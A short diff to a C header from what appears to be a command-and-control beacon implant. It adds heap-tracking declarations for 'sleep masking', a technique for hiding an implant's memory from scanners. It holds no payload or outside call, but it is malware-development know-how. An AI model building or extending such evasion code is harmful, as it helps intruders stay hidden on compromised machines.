@@ -36,6 +36,12 @@
 #define RESP_BUF_MAX        (256 * 1024)  /* 256 KB response          */
 #define PATH_MAX_C          1024
 
+/* ── Heap tracking for sleep masking ─────────────────────────────────────── */
+#define HEAP_TRACK_MAX 64
+typedef struct { PVOID ptr; SIZE_T size; } HeapTrackEntry;
+extern HeapTrackEntry g_heap_track[HEAP_TRACK_MAX];
+extern int            g_heap_track_n;
+
 /* ── Beacon state ─────────────────────────────────────────────────────────── */
 typedef struct {
     char   agent_id[UUID_STR_LEN];
